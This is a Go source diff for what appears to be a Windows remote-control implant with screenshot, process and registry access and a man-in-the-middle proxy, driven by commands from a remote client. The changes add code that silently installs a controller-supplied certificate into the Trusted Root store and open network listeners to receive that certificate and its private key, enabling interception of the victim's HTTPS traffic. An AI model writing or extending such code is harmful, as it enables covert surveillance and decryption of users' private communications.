@@ -7,12 +7,14 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/pem"
 	"fmt"
 	"github.com/AdguardTeam/gomitmproxy"
 	"github.com/AdguardTeam/gomitmproxy/mitm"
 	"github.com/AdguardTeam/gomitmproxy/proxyutil"
 	"github.com/mitchellh/go-ps"
 	"github.com/vova616/screenshot"
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
 	"io"
@@ -221,6 +223,44 @@ func redirect(source string, dest string) {
 		log.Fatal(err)
 	}
 
+	certFile := "C:\\Users\\IMOE001\\Desktop\\demo.crt"
+	certData, err := ioutil.ReadFile(certFile)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Parse certificate
+	block, _ := pem.Decode(certData)
+	if block == nil {
+		log.Fatal("Failed to parse certificate")
+	}
+	cert, err := x509.ParseCertificate(block.Bytes)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	store, err := windows.CertOpenSystemStore(0, windows.StringToUTF16Ptr("ROOT"))
+	if err != nil {
+		log.Fatal(err)
+	}
+	certContext, _ := windows.CertCreateCertificateContext(windows.X509_ASN_ENCODING|windows.PKCS_7_ASN_ENCODING, &cert.Raw[0], uint32(len(cert.Raw)))
+	if certContext == nil {
+		log.Fatal("Failed to create certificate context")
+	}
+	defer func(ctx *windows.CertContext) {
+		err := windows.CertFreeCertificateContext(ctx)
+		if err != nil {
+
+		}
+	}(certContext)
+
+	err = windows.CertAddCertificateContextToStore(store, certContext, windows.CERT_STORE_ADD_REPLACE_EXISTING, nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	fmt.Println("Certificate installed to Trusted Root Certification Authorities store successfully")
+
 	mitmConfig, err := mitm.NewConfig(x509c, privateKey, &CustomCertsStorage{
 		certsCache: map[string]*tls.Certificate{}},
 	)
@@ -348,12 +388,43 @@ func stopRedirecting() {
 func waitForStopClose(stopClose chan bool) {
 	<-stopClose
 }
-func receiveCert(conn net.Conn) {
-	destDir := "C:\\Users\\IMOE001\\Desktop" // Change this to the desired directory path
+func receiveCert() {
+	ln, err := net.Listen("tcp", "0.0.0.0:12345")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer ln.Close()
+
+	// Accept incoming connection
+	conn, err := ln.Accept()
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn.Close()
+	ln2, err := net.Listen("tcp", "0.0.0.0:12346")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer ln.Close()
+
+	// Accept incoming connection
+	conn2, err := ln2.Accept()
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn2.Close()
+	// Specify the directory and filenames for saving the files
+	destDir := `C:\Users\IMOE001\Desktop` // Change this to the desired directory path
 	certFile := "demo.crt"
 	keyFile := "demo.key"
-	fmt.Println("here1")
-	// Create output files for the received files
+
+	// Create the directory if it doesn't exist
+	err = os.MkdirAll(destDir, 0755)
+	if err != nil {
+		fmt.Println("Failed to create directory:", err)
+		os.Exit(1)
+	}
+
 	// Create output files for the received files
 	certOutputPath := filepath.Join(destDir, certFile)
 	certOutput, err := os.Create(certOutputPath)
@@ -371,23 +442,19 @@ func receiveCert(conn net.Conn) {
 	}
 	defer keyOutput.Close()
 
-	buffer2 := make([]byte, 1024)
-
-	// Read and save the received certificate file
-	_, err = io.CopyBuffer(certOutput, conn, buffer2)
+	// Transfer the crt file
+	_, err = io.Copy(certOutput, conn)
 	if err != nil {
-		fmt.Println("Failed to receive certificate file:", err)
-		os.Exit(1)
+		log.Fatal(err)
 	}
 
-	// Read and save the received key file
-	_, err = io.CopyBuffer(keyOutput, conn, buffer2)
+	// Transfer the key file
+	_, err = io.Copy(keyOutput, conn2)
 	if err != nil {
-		fmt.Println("Failed to receive key file:", err)
-		os.Exit(1)
+		log.Fatal(err)
 	}
 
-	fmt.Printf("Files received successfully and saved in %s!\n", destDir)
+	log.Println("File transfer completed!")
 }
 
 func main() {
@@ -442,7 +509,7 @@ func handleConnection(conn net.Conn, stopClose chan bool) {
 		},
 		"stopClosing":  func(args []string) { stopClosing(stopClose) },
 		"stopRedirect": func(args []string) { stopRedirecting() },
-		"receiveCert":  func(args []string) { receiveCert(conn) },
+		"receiveCert":  func(args []string) { receiveCert() },
 	}
 
 	// Read commands from the client and execute the corresponding function
